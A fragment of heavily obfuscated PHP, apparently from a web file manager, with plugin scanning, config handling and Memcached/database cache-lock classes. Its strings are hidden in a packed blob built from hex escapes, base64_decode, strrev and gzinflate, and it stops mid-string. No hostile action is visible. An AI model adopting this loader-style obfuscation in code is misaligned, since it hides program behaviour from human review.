$cã™¦½áµ² = $this->loadList($f¡¥™’ç³); if ($cã™¦½áµ² && is_array($cã™¦½áµ²[$F¸ÏåñõÎ[6]])) { $B­—²½«Ç = $cã™¦½áµ²[$F¸ÏåñõÎ[6]]; } if (!$B­—²½«Ç || $c¦æî˜ÀÏ) { $B­—²½«Ç = $this->getConfigDefault($f¡¥™’ç³); } return $B­—²½«Ç; } public function setConfig($aèçŠÒš¾è, $C‘áºÑŒ£¿ = false) { goto cšµ×¥¬³¾; FÀËÉéê…: $this->update($d…ß¬Ùæ“Ç[$D¹Š¾ ÁÆ[404]], array($D¹Š¾ ÁÆ[6] => $bËĞ‘±êñˆ)); goto d‚êŸ’£È‘; D›èğ“…¯Ë: $bËĞ‘±êñˆ = $d…ß¬Ùæ“Ç[$D¹Š¾ ÁÆ[6]]; if ($C‘áºÑŒ£¿ == !1) { $bËĞ‘±êñˆ = array(); $C‘áºÑŒ£¿ = $this->getConfigDefault($aèçŠÒš¾è); } foreach ($C‘áºÑŒ£¿ as $C” ÛµÁÀ => $dã’ËÀÏ) { $bËĞ‘±êñˆ[$C” ÛµÁÀ] = is_string($dã’ËÀÏ) ? trim($dã’ËÀÏ) : $dã’ËÀÏ; } goto FÀËÉéê…; cšµ×¥¬³¾: $D¹Š¾ ÁÆ =& $_SERVER[œÕÊİğö]; $d…ß¬Ùæ“Ç = $this->loadList($aèçŠÒš¾è); if (!$d…ß¬Ùæ“Ç) { return !1; } goto D›èğ“…¯Ë; d‚êŸ’£È‘: } public function viewList() { goto eóÏ´¸”Ğ; Eˆî²˜¬Çù: return $fÉ™‹Ó‹óñ; goto b„‹æ°°; eóÏ´¸”Ğ: $eµ‹»Œ”Ô¡ =& $_SERVER[œÕÊİğö]; $eğâŒÂÆ¢ = $this->loadList(); $this->pluginScan($eğâŒÂÆ¢); goto béê¿ø›­‘; béê¿ø›­‘: $eğâŒÂÆ¢ = $this->loadPluginList(); $fÉ™‹Ó‹óñ = array(); foreach ($eğâŒÂÆ¢ as $bå©–ˆÌ† => $f’Åò« …) { unset($f’Åò« …[$eµ‹»Œ”Ô¡[1837]], $f’Åò« …[$eµ‹»Œ”Ô¡[6]]); $FÂÀÔ…ùäÓ = PLUGIN_DIR . $f’Åò« …[$eµ‹»Œ”Ô¡[38]] . $eµ‹»Œ”Ô¡[1839]; if (!is_file($FÂÀÔ…ùäÓ)) { continue; } $a„ğİ®È = Hook::apply($f’Åò« …[$eµ‹»Œ”Ô¡[38]] . $eµ‹»Œ”Ô¡[1845]); if (is_array($a„ğİ®È)) { $fÉ™‹Ó‹óñ[$bå©–ˆÌ†] = array_merge($f’Åò« …, $a„ğİ®È); } } goto Eˆî²˜¬Çù; b„‹æ°°: } private function loadPluginList() { $c¯Šã’Ê¶ì =& $_SERVER[œÕÊİğö]; $c÷­ÓŠäé¢ = $this->loadList(); if (strtolower(MOD) == $c¯Šã’Ê¶ì[1846]) { return $c÷­ÓŠäé¢; } $Fƒ©øù‘Œ£ = Hook::trigger($c¯Šã’Ê¶ì[1847], $c÷­ÓŠäé¢); if ($c÷­ÓŠäé¢ && !$Fƒ©øù‘Œ£) { die; } return $Fƒ©øù‘Œ£ ? $Fƒ©øù‘Œ£ : $c÷­ÓŠäé¢; } private function pluginScan($féâŒï¶‡) { $Fø§Ö‘Èª =& $_SERVER[œÕÊİğö]; recursion_dir(PLUGIN_DIR, $e…Ñàíéˆä, $bì¨ÓÎ©¬Î, 0); foreach ($e…Ñàíéˆä as $fÑÀ±Ğ°Ü) { $fÇ»Ú¨Œ£ = get_path_this($fÑÀ±Ğ°Ü); if (isset($féâŒï¶‡[$fÇ»Ú¨Œ£]) || !file_exists($fÑÀ±Ğ°Ü . $Fø§Ö‘Èª[1848]) || !file_exists($fÑÀ±Ğ°Ü . $Fø§Ö‘Èª[1839])) { continue; } Hook::apply($fÇ»Ú¨Œ£ . $Fø§Ö‘Èª[1842]); } } } goto C”—·ÉÉÓô; f·£öçßÑ: class CacheLockMemcached { public function lock($cÖœŠ‰«ôÇ, $eš¼»‰é±˜ = 0) { $A–‡Ä¦ôŒ = Cache::init(); $c¹ù¡Ï­…Ó = microtime(!0) + $eš¼»‰é±˜; while (microtime(!0) < $c¹ù¡Ï­…Ó) { $d‹«ÀÆíÌ¿ = $A–‡Ä¦ôŒ->get($cÖœŠ‰«ôÇ); if (!$d‹«ÀÆíÌ¿ || $d‹«ÀÆíÌ¿ < microtime(!0)) { $dÇØ‘æ•î = $A–‡Ä¦ôŒ->handle->add($cÖœŠ‰«ôÇ, $c¹ù¡Ï­…Ó, $eš¼»‰é±˜); if ($dÇØ‘æ•î) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eÜ‰ŞŸ£ƒ) { return Cache::init()->get($eÜ‰ŞŸ£ƒ); } public function unlock($DÚÇŒùŒµä) { return Cache::init()->remove($DÚÇŒùŒµä); } } class CacheLockDatabase { public function lock($D‰¸µ„´, $F˜ ˆö¤µé = 0) { $Cà­Õµƒã“ = Model($_SERVER[œÕÊİğö][826]); $eê’è¾ òÜ = microtime(!0) + $F˜ ˆö¤µé; while (microtime(!0) < $eê’è¾ òÜ) { $B†Œ©˜‚ÀÁ = $Cà­Õµƒã“->get($D‰¸µ„´); if (!$B†Œ©˜‚ÀÁ || $B†Œ©˜‚ÀÁ < microtime(!0)) { $fÌ‹´¸®Õ™ = $Cà­Õµƒã“->set($D‰¸µ„´, $eê’è¾ òÜ); if ($fÌ‹´¸®Õ™) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cìØî¤†Û ) { return Model($_SERVER[œÕÊİğö][826])->get($cìØî¤†Û ); } public function unlock($CŠÊµôÙ‡ö) { Model($_SERVER[œÕÊİğö][826])->remove($CŠÊµôÙ‡ö); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($E‘Âùå¨Ù, $aÖ›¼¸ŒÚŞ) { $bÜèâ³ÄÉ± =& $_SERVER[œÕÊİğö]; if (!class_exists($bÜèâ³ÄÉ±[853])) { show_json($bÜèâ³ÄÉ±[854], !1); } $this->cacheTime = $aÖ›¼¸ŒÚŞ; $this->handle = new Memcached(); if (is_array($E‘Âùå¨Ù[$bÜèâ³ÄÉ±[855]]) && count($E‘Âùå¨Ù[$bÜèâ³ÄÉ±[855]]) >= 1) { foreach ($E‘Âùå¨Ù[$bÜèâ³ÄÉ±[855]] as $C­Ôòá˜¹) { $Eî¥‹…–À = explode($bÜèâ³ÄÉ±[4], $C­Ôòá˜¹); $this->handle->addServer($Eî¥‹…–À[0], $Eî¥‹…–À[1]); } } else { $this->handle->addServer($E‘Âùå¨Ù[$bÜèâ³ÄÉ±[185]], $E‘Âùå¨Ù[$bÜèâ³ÄÉ±[186]]); } } public function set($CñùËò…°Ù, $Fï›µ×µ¾, $DÇÓÆôÎƒ = false) { $DÇÓÆôÎƒ = $DÇÓÆôÎƒ ? $DÇÓÆôÎƒ : $this->cacheTime; return $this->handle->set($CñùËò…°Ù, $Fï›µ×µ¾, $DÇÓÆôÎƒ); } public function get($Bò†êİÜŠö) { return $this->handle->get($Bò†êİÜŠö); } public function remove($CµŞô¤«‘Ì) { return $this->handle->delete($CµŞô¤«‘Ì); } public function deleteAll() { return $this->handle->flush(); } } goto dÁò„íŒ»¨; A‡½å¥šÕ: $CÒ¨Ê°Ø = strrev(base64_decode($_SERVER[ï][0])); function binCheckNeq($aøÖ£‰óÈ÷, $DîŞ…Ü¶×À) { return $aøÖ£‰óÈ÷ != $DîŞ…Ü¶×À; } $_SERVER[$_SERVER[ï][1]] = $CÒ¨Ê°Ø($_SERVER[$_SERVER[ï][2]]); goto A¤éÑèáàç; Cİƒ÷–ŸÍ: if (!function_exists('_kodDe')) { function _kodDe($DÏÆ©İµ×Š) { $DÏÆ©İµ×Š = base64_decode($DÏÆ©İµ×Š); $eÄº¬–Éë² = strlen($DÏÆ©İµ×Š); $EÍáÈ½¯’‰ = ''; $d¾Ò‘¬°ÒÚ = ord($DÏÆ©İµ×Š[0]) - 30; for ($EÒ…ö¹’™ = 1; $EÒ…ö¹’™ < $eÄº¬–Éë²; $EÒ…ö¹’™ += 2) { if ($EÒ…ö¹’™ + 1 < $eÄº¬–Éë²) { $EÍáÈ½¯’‰ .= chr(ord($DÏÆ©İµ×Š[$EÒ…ö¹’™ + 1]) + $d¾Ò‘¬°ÒÚ); $EÍáÈ½¯’‰ .= chr(ord($DÏÆ©İµ×Š[$EÒ…ö¹’™]) + $d¾Ò‘¬°ÒÚ); } else { $EÍáÈ½¯’‰ .= chr(ord($DÏÆ©İµ×Š[$EÒ…ö¹’™]) + $d¾Ò‘¬°ÒÚ); } } return $EÍáÈ½¯’‰; } } define("\x9c\xd5\xca\xdd\xf0\xf6", "\277\335\213\355\307\312\243\205"); $_SERVER[œÕÊİğö] = explode("\x7c\x1\x7c\x2\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xc5\xbd\x9\x7c\x14\x45\xf6\x38\xae\xa2\xee\xa2\xab\x5f\xaf\x45\x44\x57\x9a\x28\x26\x81\x39\x92\x70\x7\x2\x4e\x32\x93\x64\x64\x92\x9\x33\x13\xce"."\300\320\231\351\311\164\62\63\75\351\356\311\5\350\256\342\301\251\2\342\55\253\170\241\2\136\50\240\210\347\52\253\253\353\172\301\172\53\1\74\126\127\167\321\165\25\375".base64_decode('1V3VPYN+/5//7/P5oTBVr46uevXq1atXr159ufDIhUctHPAP/AP+g78oPHTZr48=')."\100\177\6\54\133\132\122\122\77\366\270\221\215\277\271\362\341\215\362\46\371\76\171\151\60\360\342\113\376\23\136\276\357\2\337\276\365\57\366\356\73\362\10\271\346\366\277"."\x56\x82\xcc\xb8\x6c\x25\xfe\x91\x32\x9a\x29\x29\x3d\xaa\x61\x1a\x18\x10\xd3\x32\x9\xb5\xd\x87\xd5\xc\xfe\x75\xe3\x9f\xa8\x9c\x50\x53\xa\xe\xc3\x90\xa1\xf6\x29\x62\x4a\x18\xc4\xfd\x19".base64_decode('nh5tU8woqM9UMrT2ak/YXxNt8kTqcVzOZt1GvMNwy3osqXYpAbXV3apm3HHZlF0=')."\xad\xf4\xfb\xc7\xe1\x9f\xd1\xa4\x85\x49\x25\xd6\x11\x95\x5b\x35\xdd\x54\xe2\x18\x94\xcb\xa4\xd4\x4c\x7\xe\x1b\x9d\x29\xd5\xa4\xed\x6a\xc\x46\xa2\xe1\xe6\xa6\x26\x5f\x28\x12\x25\xfd\x16"."\xd3\xd3\x5a\x9c\x84\xb2\xb2\x2e\xa7\x49\x23\xb3\x8a\x6e\x0\x84\x88\xd5\x45\xb3\x5a\x56\xc9\x58\x20\x1c\x0\x1b\xdb\x2a\x1b\xa4\x26\x6f\x75\xd4\xeb\x6b\xa\x4\x67\x45\x23\xb3\x9a\x7c\x24".base64_decode('R2u0M6fovTiGgmFT1s2ImlZYjm6dtavaV+dvlCIhT2PYUxPxBxsxuCbY0OCP5MM=')."\103\301\100\240\332\123\63\65\77\245\51\344\251\153\360\110\240\175\140\70\324\114\102\53\221\346\343\224\371\122\51\16\324\252\112\212\240\61\43\323\346\230\275\131\22\212\260"."\20\240\224\114\56\225\302\221\106\26\42\355\127\22\162\56\105\160\346\25\43\131\135\115\313\264\353\123\225\136\6\45\24\220\63\65\65\23\303\21\137\217\251\313\34\16\132"."\x1c\xd3\x95\x34\x20\x1f\xc\xb\xfb\x2\xbe\x9a\x88\x4\x9b\x29\xd5\x86\x82\xd\x12\x19\x8a\xb4\x6c\x98\x8a\x2e\xcd\xa8\xf7\x85\x7c\x12\x6c\x7a\x55\x31\xea\x71\xb1\x84\xcb\x35\x37\x2\x84"."\110\236\100\100\72\134\15\246\222\316\322\152\160\231\2\225\5\103\136\137\110\252\236\45\161\74\305\264\164\132\313\270\100\55\140\74\115\241\251\276\120\10\7\34\144\236\5"."\374\160\350\110\44\130\133\33\366\261\30\351\334\264\0\150\311\50\102\245\226\130\74\221\62\243\135\162\52\107\211\225\220\172\61\371\41\277\232\101\10\270\123\315\250\71\102"."\xac\xa4\xa\x4d\x63\xf3\x9b\x4\x72\x34\xb7\x42\x21\x4a\x9c\x4\xd2\xa0\xbc\x46\x58\x0\x98\xbf\x5d\x38\x58\x35\x19\xff\x4e\x24\x99\x5a\xe1\xdc\xee\x52\x74\x33\xaa\x64\x62\x5a\x5c\xcd\x10"."\256\61\205\314\75\102\201\262\231\364\352\140\152\353\244\102\315\25\323\262\275\15\132\227\300\111\2\154\272\45\264\124\134\321\171\74\13\212\213\51\244\127\214\363\300\322\215".base64_decode('ubSYhUUBR0nFdSXzyzkBH1ATvXw2GlpOjwFeltB42SbWknKSSTFN0GmD9qs5m9I=')."\xe4\x78\x58\xd1\x85\xbe\xd6\x82\x82\xc1\x9c\x29\x2\x73\x28\x5b\xad\xa6\xa7\xbd\x80\x6f\x90\xef\x83\xd9\xa2\x36\x17\x48\xe8\xa0\xf3\x25\x2e\xa0\xd0\x45\xb8\x72\xc9\x9c\x3f\x38\x7f\x9c\x3b"."\xe7\x7c\xf0\x4f\x29\x61\xd1\x2d\xa4\x69\x49\x25\x95\x8a\x2a\x3d\xa\x99\x57\xe9\xf8\x18\x83\xf6\xd5\x6d\x40\x6\xb\x20\x38\xea\xf\x46\x93\xb2\x91\x6c\x88\x8f\x89\xa2\x52\x94\xf3\xc7\x95"."\36\127\66\231\45\123\237\315\366\26\13\335\303\321\151\324\114\237\260\176\244\264\230\234\22\173\212\303\111\323\314\206\225\114\274\226\255\40\161\255\73\203\20\226\125\50\33".strrev('ñÎ3•UÃYIcH¤cÒ¸‘Å{4ÁöˆX§LƒJÕ+ê’Í Ô¸¤:÷')."\x6c\xe5\x49\xa9\x31\xd9\x54\xb5\x8c\x5b\x8b\x99\x8a\xe9\x34\x4c\x5d\x91\x49\x6d\x9e\x58\x4c\x31\xc\x67\xd\x58\xbc\x74\x2d\xe5\xf4\xa4\x52\x5a\xb7\x33\xa8\xab\x6d\x6a\xa6\x52\x1a\x41\xb8".base64_decode('MV7ZnJBDVpJJXDRRgrQCGcQI/DU6OVluXc4YCUV3+sikqZTAeDAGSbN5VSOrGSo=').base64_decode('bF6lJJumHEtC5sKrr/qZ/CpcDpW8vL6erKorBm2rVNcQIZWA2hVnky63peVKKZs=').base64_decode('awWYIbO3AAznJqiplGIw6pDSOcN06grgUipYD8kY+xPOBji1VCXuDANmTsCjykY=').strrev('¯ XH1L¦p)*³E€›hÛ”Ï‚2!©Á´_FìÖ_ÔSH‘õ¡†š$l€K').base64_decode('2KR1Kzr4cHVvpdShxVu1HhdNqiXSCs0MhztrOkNypg3ip7XXVAj5GV1tVkQHlEw=')."\233\231\244\5\303\276\320\164\137\50\32\16\326\106\146\170\102\144\265\317\0\52\351\241\237\202\125\247\234\41\45\16\120\37\63\151\71\71\13\261\106\363\300\211\1\307\212"."\246\302\311\102\323\2\376\72\210\30\257\323\0\231\234\142\56\132\167\100\115\253\260\355\46\113\101\230\4\242\100\35\151\220\33\165\250\252\45\71\242\244\45\76\262\324\11".base64_decode('/h1ROqfF6xoxd4pb5WXc5a5yqaJsrNQEZBNVTkmk03k5yqTg1J9BAFy6hGltQx0=')."\6\206\174\323\232\175\341\110\264\301\27\251\17\172\311\27\174\36\22\12\150\170\152\322\36\315\301\77\163\135\234\37\203\61\367\247\345\66\33\227\206\261\6\115\127\254\20"."\276\152\314\120\343\224\215\303\150\275\242\266\45\111\377\124\130\133\114\113\151\272\234\202\134\214\22\261\102\71\113\233\232\40\343\203\31\46\217\204\325\164\226\362\65\63\231"."\x4b\xb7\xa\x41\xc2\x84\xc\x30\xde\x74\x79\x49\x6a\x6c\x79\x3\x42\x2c\x59\xf1\xdd\x24\xe3\xf0\x8a\x5a\xca\x99\xdd\xe1\x51\xe0\x7f\xce\x86\xe3\x5a\x5a\xa6\x32\x31\x62\x49\x4a\x1c\xf3\x24".strrev('12°6HËÒÊ$lP¥%q•´m¬r“IÕI˜ ÒÉn¨A©ºš^¾dW©Ia')."\134\361\15\2\20\334\0\224\57\251\252\21\2\45\241\40\105\343\63\240\274\313\1\46\313\232\2\253\111\260\265\35\114\27\42\111\250\106\255\260\370\107\65\224\6\32\57"."\363\374\115\272\222\120\311\244\313\200\21\153\220\365\16\132\0\214\20\137\166\140\104\250\254\266\71\20\210\326\4\33\43\100\206\306\220\31\41\177\304\107\151\324\343\215\172"."\152\232\330\42\312\107\234\144\200\14\43\177\65\300\220\256\12\141\45\342\113\26\147\346\164\251\205\314\32\207\1\167\316\152\31\103\161\222\135\223\63\316\331\72\316\61\321"."\xc6\xd3\xf3\x4a\x70\xc9\xbd\xc7\x29\xa7\xfb\x9c\x69\x80\x26\x27\x6b\xba\x75\x85\x95\x22\xe2\x42\xed\x27\xe3\xca\xd9\x37\x44\x2c\xd8\x18\xd1\xa5\xbd\x29\x18\x26\x5\xa6\x40\x28\x90\x9e\x5a".base64_decode('FZ20o6mZJKUFmqrzRegyLROhyTMjTHluDmTU1T6Zd24KbQiptCed4pKgtTtOPgg=')."\221\172\177\343\324\150\103\320\353\13\104\375\215\200\41\105\362\341\315\115\136\17\35\125\21\136\35\244\73\121\2\155\6\54\151\272\47\340\267\147\367\315\364\207\43\341\202".base64_decode('SQDW7LOlEGxXR5tCvlr/TBat9fsC3nC0xlNT72PARk8DiUQTcDNmuK35o4DDhtk=')."\x96\x2e\xda\x5\xb7\xa7\x14\x65\x51\xcb\xfe\x29\x4a\x77\x6\x51\x4e\x6\x60\xb5\x54\x8\xe9\x91\x4e\xc3\x4d\x31\xea\xf\x11\xd1\x63\x5a\x8e\x12\x23\x93\x12\xd3\x94\xa9\xa4\x65\x32\xab\x64"."\272\22\226\340\237\122\311\23\226\314\154\224\261\217\326\136\26\104\335\240\161\40\17\222\357\113\204\333\347\265\40\12\363\124\53\11\306\270\13\3\74\11\223\61\1\133\34".base64_decode('TAueBsbBg3bfgB7QuETpVDPAdsVDm5PgO99osMkX8sB9c3RGKNhYRwp0JxXaAD8=').strrev('Ê	Ì–èÆs2½b†Jãä}HøyÏñ•k·¤qAİ2>ˆäÙöÈ•	A')._kodDe('LaZ57A2cS5aXJdnz9lTxXfjO1EFf2hOtkhVYwk5zufoD5j83JlYaidJ+MfEJo6ey')._kodDe('KDcGn37GawrzAkS474hqQOFEXd6bsWgIPEwgkLY0O5TlyM2oM4RammkkYYr+LoQV').base64_decode('R0msxWWJnkvK53RWGspFJcaU0soWd4u7ZErlHI+zT3b2lTknOOeObHGVjiSAuQs=').base64_decode('KhyjF8EMIOOUc+aCn6qWKcNbnOddOP/8OS1ziytHDmtxndPSPXdE6RT6nVhOB3s=').base64_decode('xVgva2p8ZAloEpCXWJYM4nhCBprQp2Y5dMHYRRQOxlBp4yXmOFtGzp0ilBNA9m8=')."\1\131\11\260\337\44\313\347\161\316\206\75\143\105\341\274\47\364\221\313\304\70\17\205\363\242\125\216\21\76\240\266\145\330\24\2\102\0\333\243\133\305\364\5\303\361\357"."\42\72\220\155\112\17\145\15\231\204\252\23\352\314\145\324\116\252\202\310\50\235\44\240\231\224\276\133\25\263\133\241\344\1\340\226\70\40\16\272\57\4\111\102\54\205\244"."\x42\xf2\x5\xbe\x3f\x53\xd0\x66\x85\xf4\x22\x1b\x85\x22\x59\x37\x8b\xc5\x95\xc\x19\xa7\x81\x24\xb7\x11\x93\xb3\x4a\x58\xe8\x61\x34\x1a\xf1\x54\x7\x7c\x51\xca\x61\x8\x27\xa6\x71\xc4\x15"."\253\231\322\16\164\215\163\124\312\37\142\134\106\107\333\21\62\363\215\316\224\204\30\203\244\350\272\246\127\42\25\252\221\313\102\131\16\154\275\114\200\133\11\354\333\245\252"."\311\22\106\71\51\27\25\7\40\53\123\301\1\156\245\5\141\0\162\50\322\246\54\37\41\3\110\140\124\34\162\227\264\264\344\346\50\361\271\163\0\341\313\316\304\334\5"."\xa3\x16\x95\x52\x31\xde\xdd\x2\xfe\xd0\x88\xa7\x80\xe\x2d\xca\xb8\x61\x14\x2c\xcf\x2e\xd8\xe\xa6\x6\xb1\x44\x58\x32\x8e\x6a\x3a\x93\x99\xb2\x16\xa9\xdb\xd4\x4c\x39\x65\xa9\x22\x2\x21".base64_decode('lDXR5ZtoDPBoBzjHggu6oIJE7LSR6deY/kPQfsESYcV0sRwOITEK4qR/VUWUzWc=')."\300\104\252\21\26\71\254\270\11\367\32\246\222\266\350\52\15\5\352\241\153\163\251\224\311\244\376\224\332\101\352\46\263\144\176\241\274\265\232\116\167\267\43\310\167\213\106"."\x14\xca\xe8\xcf\x64\xc0\x5e\x54\xa4\x2a\xbe\x9e\xd6\x79\x80\xfc\x12\x91\x4a\xa8\x5e\x4f\xf2\x37\x4a\xd5\xc1\x60\xc0\xe7\x69\x94\xe0\xd2\x4d\x96\x1c\x20\x17\x84\x7d\x4d\x1e\xb0\x5e\xc1\x7d".base64_decode('cjjiI6pGv9dJ653p9JOdFAuocTpCgM2ZFEo0XSQGBUsHVOo4oPzgAM11wF2Sgws=')."\363\16\256\52\163\164\251\112\67\12\60\231\332\101\104\155\207\51\353\100\14\200\262\60\11\372\275\16\325\360\242\175\4\372\0\112\242\15\62\223\120\175\221\222\173\35\270"."\161\1\245\113\111\71\150\323\34\264\305\16\272\17\160\240\175\235\227\64\253\31\114\31\322\54\24\4\234\61\351\200\104\2\151\324\301\125\171\344\163\302\306\303\301\67\45".strrev('GÉ‘…ù(ùI‚“oöÙé¸Wq… ÷ò:hİLÓH@2–ğn„—è›eË]6')."\276\165\57\265\0\327\110\366\344\213\350\262\145\311\303\307\222\316\247\224\302\143\20\333\74\64\235\317\104\330\241\132\271\113\44\263\102\44\107\27\17\112\236\134\267\316\125"."\277\134\230\265\357\52\355\212\133\370\321\210\334\26\26\76\147\312\155\364\133\5\122\161\70\244\304\172\143\174\147\352\25\366\273\326\30\33\0\64\123\12\121\171\341\201\145"."\224\313\306\341\270\201\3\51\42\51\71\263\101\265\314\202\137\236\177\244\47\210\235\5\263\134\24\300\215\205\314\64\14\226\246\332\224\114\326\236\12\61\231\260\121\207\65"."\6\247\217\13\261\125\164\330\21\146\152\212\200\257\66\42\135\20\4\214\111\325\242\270\114\24\146\226\320\77\132\106\262\324\115\321\45\125\241\164\36\227\63\161\14\231\17"."\370\365\374\252\42\372\221\42\113\161\116\13\326\106\70\150\124\312\247\56\210\156\21\11\160\5\102\335\347\153\14\5\5\371\222\226\43\362\233\154\220\235\24\324\116\223\220"."\x42\x61\x7c\x68\x45\xe2\x43\xe3\x6b\x7\xd0\x76\x59\xbe\xb\xa3\x7c\xe2\x50\x92\x90\xe0\x7\x1c\x82\xc4\x1\xd9\x87\x93\x4f\x1\x21\x4a\x7e\xac\x98\xb7\x11\xa6\x6d\x3d\x84\x98\x6a\x52\x33".base64_decode('vWpG1FFxKF9S+YoOJ7JNq+Y9XBivFlwH5iC6MQc8kBXWXK6AAa1Hh8O87aQmW8s=').base64_decode('KSclnW4GG/uobSITwk/KOscp5Thw2nPNH8zCo0K2hNzFpQ1LGYFvGGYvbb0YtFY=')."\212\243\336\303\105\352\231\276\242\120\124\144\111\252\21\140\207\331\326\60\352\151\104\53\30\205\352\63\32\326\20\375\323\323\154\313\172\217\366\372\45\24\106\4\212\250\240".base64_decode('AWCcyloON9DDmD0Qz1NgidNdcDLVwRVLXCwYczfg6ihSaFgBs4hAeG3hvDQxN9c=')."\x1\xc1\x85\x80\x2f\x1c\x14\xf3\x7c\x5e\xf2\xd1\xe0\x93\xd0\x42\x38\x6d\xbc\xa5\x39\x90\x23\x9a\xdf\x28\x48\xfc\x85\xe3\xb5\xba\xc6\x84\x5c\x26\x7\xd8\x33\xd5\xa0\x5d\xa4\x29\xa2\x5e\x58"."\304\5\104\131\344\215\74\220\120\306\56\171\330\240\266\250\35\337\144\251\302\40\252\142\226\343\151\65\343\322\361\242\347\2\173\3\162\130\354\50\23\104\62\316\251\26\30"."\x68\x69\x21\x8b\xe4\x22\x1b\x1\x98\x9a\x6\x36\x9c\xba\x4b\x7\x5f\xe6\xd\x22\xe2\x7e\x8e\xd\xc3\x5c\xd2\x2a\x54\x15\xcf\x27\x30\x4b\x94\x12\xd0\xe8\xd6\x15\xce\x7f\x5f\x5c\x35\x21\x4".base64_decode('rnIa1UvzjMKBLYOJ3BctInmDwAV6x3BLzkJLvWsEWp1dhc+h4Uk2DgnGG2l2tI0=').base64_decode('gC7D1LI8RYjiZCGJVyrkYohG7QCkHkfyK0cUykvKom0tnk2uFMghnJf4vR5dp+Q=').base64_decode('gzsHVegAKIIgXwpT2i+00ODKfV3cKANXBT/swjPRJcfjQarSFsP5WUUVX+GKkJ0=')."\14\253\112\210\25\316\356\111\245\370\351\271\75\176\330\42\170\322\211\205\104\310\141\213\325\242\235\45\75\346\52\4\143\173\16\121\240\266\12\320\334\226\301\56\150\133\171"."\351\341\245\217\303\60\33\76\240\205\343\140\245\256\111\252\31\305\140\13\256\156\24\342\35\377\217\305\334\374\61\200\163\345\160\204\3\323\4\265\260\256\100\200\270\272\62".base64_decode('3SdnTYIAgRbjqGkRfUKoDmHyWOgBTFbcZ7g8+INgMhamUHs+hWp/EZ/rYUucWAg=')."\x50\x14\x94\x9b\xe\x57\x27\x4d\x66\x55\x71\x21\xeb\xe0\xdf\x1e\x3a\xf0\x30\xe\xae\xf9\xfe\xf5\xd7\x5e\xfa\xfd\x1f\xdf\x5e\x42\xfa\x9f\x6a\xef\xca\x18\x44\x41\x4\xfe\x1d\xb0\x30\xcf\x98"."\xf0\xd2\x99\xb\xb4\x8f\xff\x74\x72\xdd\xdb\x6e\xbd\xf7\x8c\xd3\x1f\xfd\xdb\xb4\xdb\x6e\x69\xd8\x7c\xc5\x7d\x97\x3b\xd7\xa5\xf6\xac\xfa\xfc\xb1\x96\x1b\xce\x59\xfb\xe2\x1d\xde\x65\x7b\x43"."\13\147\256\272\361\242\213\37\331\325\177\345\151\245\67\34\325\360\352\155\47\314\376\343\61\177\337\173\324\303\365\177\75\372\320\330\203\173\276\33\64\127\157\273\366\366\205"."\xd7\x9e\xbd\xfc\xb5\x2f\x3e\xef\xe8\xda\x37\x6e\xd4\xce\xe1\xb3\x7a\xc7\x8e\x79\xe1\xed\xf7\x7b\xbf\x5f\xa0\x5d\xf4\xe8\xb\x17\x55\xbf\xaf\xf7\x7c\xf6\xf4\x98\xb7\xb6\x1c\xbb\x61\x8c\x79".base64_decode('x67h4Rs/feHsq33ei++/+9TV/71/98DUJWs671j84nDXwOopt4+de8q6b6/ev6I=')."\xe8\xda\x47\xab\x26\xde\x30\x7b\xdb\x23\x67\x7d\xf4\xd3\x50\xe5\xbc\x9b\xa6\xbd\xfa\xf4\xb\x8f\x6c\x29\x91\x9e\x48\xd4\xba\xf6\x3d\x58\x75\xc1\xfe\xd0\x57\x9f\x44\x6e\x5a\x1b\xde\x74\x69"."\xcd\xb2\xed\xe9\x47\x86\x1c\x7b\xf5\x19\x4b\x97\x5c\x57\x9b\xf9\xf5\x90\xda\x61\x7\x2f\x3d\x7b\x56\xee\xb9\xef\x8a\xd7\xff\x21\x78\xd6\x90\x53\x7a\x6b\x6e\x7c\xb2\xe9\xa4\x4f\xee\x3b\x7e"."\xea\xa2\xa1\x1b\xb7\x3c\xf9\x48\xd9\xae\xe3\xce\xfa\x28\xe8\xdf\x7e\xf2\x8a\xdb\x4f\x5c\xbb\xba\xf3\x99\xbb\x17\x2c\xfc\xdb\xef\x82\xf\xaf\x9e\xb6\xee\xf8\x2f\x66\x6e\xf2\x4c\xf7\x69\xfb"."\336\275\172\377\237\37\232\371\314\267\311\43\356\374\367\256\210\321\164\105\333\15\217\177\166\363\270\153\252\117\375\255\153\366\245\227\117\331\266\176\307\226\23\26\74\31\34"."\174\240\361\241\333\106\172\67\217\336\32\277\164\120\327\357\66\354\56\31\367\324\323\307\226\73\117\137\63\161\160\127\117\154\322\221\257\75\362\132\355\105\75\57\274\375\330"."\45\37\66\166\374\121\361\115\170\173\310\62\351\334\343\356\131\35\172\346\210\252\242\266\133\307\235\164\317\111\133\116\354\273\352\370\226\315\153\116\210\113\253\247\26\275\73".base64_decode('5bUHQs6RylUtVyVnVdy7ddpwaeCdu8c9cE+R7/PY7rbjmzeUnvDOESc9f8SIW+Y=')."\304\147\335\76\157\371\62\351\362\153\376\225\334\170\116\144\344\365\211\135\57\274\364\150\351\63\37\217\177\372\272\243\347\247\216\177\145\306\321\237\335\223\171\363\57\216\125"."\xcb\x7e\x68\x9b\x7f\x8c\xfc\xca\x83\x77\x5c\x99\x8b\xbb\xfc\xf\x55\xf\xf9\xed\xfa\xa7\x87\xdf\x7c\xce\x99\x1b\x97\xbc\x72\xeb\xbc\x73\x7b\x6a\xbf\x95\x3f\xdb\x76\xe1\x23\xa1\x15\xdb\x67".base64_decode('33PGiN03PzXgrMp5oz6e8Iw3d8UFRx1x4qpba/ZeldpZc9Q/b596xau3nDxJm/o=')."\xf0\x87\x4f\x8e\xbb\x72\xe1\xb1\xea\x6f\x16\xf4\x94\xfc\x7a\xed\xeb\xe3\x6a\xaf\x76\x56\xdf\xb8\xf5\x64\xed\xfa\x41\x3\xe6\xd\x6d\x9c\x5b\x71\x45\x6f\xf2\x82\x63\x23\xb5\xf7\x9c\xf4\xc0"."\251\373\207\35\174\160\302\372\53\215\167\37\271\277\350\313\57\56\75\361\235\225\303\256\73\143\345\243\113\56\161\54\170\360\33\357\151\147\254\354\157\114\170\337\311\374\271"."\372\205\63\247\15\271\363\364\23\27\125\137\166\313\362\135\147\174\275\153\361\331\127\255\375\313\327\177\135\274\102\31\324\370\327\321\47\57\233\163\371\103\125\57\226\75\33"."\xba\xd6\x11\xbc\xee\xed\x5\x6b\x94\x31\x53\x8a\xdb\x7b\xe7\x2d\x3d\xf0\xd2\x